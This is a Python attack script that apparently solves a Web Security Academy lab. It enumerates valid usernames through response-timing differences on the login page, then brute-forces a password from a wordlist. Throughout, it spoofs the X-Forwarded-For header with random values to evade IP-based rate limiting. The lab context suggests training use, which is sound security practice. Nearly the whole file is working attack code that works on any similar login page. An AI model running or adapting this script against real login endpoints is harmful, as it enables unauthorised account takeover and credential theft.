from random import random
import requests
import html
import random

def getHeader(iter):
    return {'content-type': 'application/x-www-form-urlencoded', 'Accept-Charset': 'UTF-8',  'X-Forwarded-For':str(iter)}

url = 'https://0a0100fc04a57fbac01b62e2002600e6.web-security-academy.net/login'
defaultCookies = { 
    "session":"OgOjQP79wlNGC9tYlWE7X5V6pzfQyrIu"
}

password = []
defaultPayload = {
    "username": "wiener",
    "password": "x"*1000
}

def getUserPayload(name):
    return {
        "username": str(name),
        "password": "x"*1000
    }

def getPasswordPayload(name, password):
     return {
        "username": str(name),
        "password": str(password)
    }

def getUsername():
    with open('userList.txt') as file:
        
        for line in file:
            ranNum = random.randint(1, 1000)
            user = line.rstrip()
            payload = getUserPayload(user)

            r = requests.post(url, data=payload, headers=getHeader(ranNum), cookies=defaultCookies)
            print('Probando con: %s' % (user))
            if(r.elapsed.total_seconds() > 4):
                print('el usuario es correcto: %s' % (user))
                f = open('index.html', 'w')
                f.write(html.unescape(r.text))
                f.close()
                break

def getPassword():
    with open('pwdList.txt') as file:
        
        for line in file:
            user = "argentina"
            password = line.rstrip()
            ranNum = random.randint(1, 1000)
            payload = getPasswordPayload(user, password)

            r = requests.post(url, data=payload, headers=getHeader(ranNum), cookies=defaultCookies)
            print('Probando con: %s' % (password))
            if(not ("Invalid username or password." in r.text) ):
                print('el usuario es correcto: %s' % (user))
                print('La contraseña es: %s' % (password))
                break
getPassword()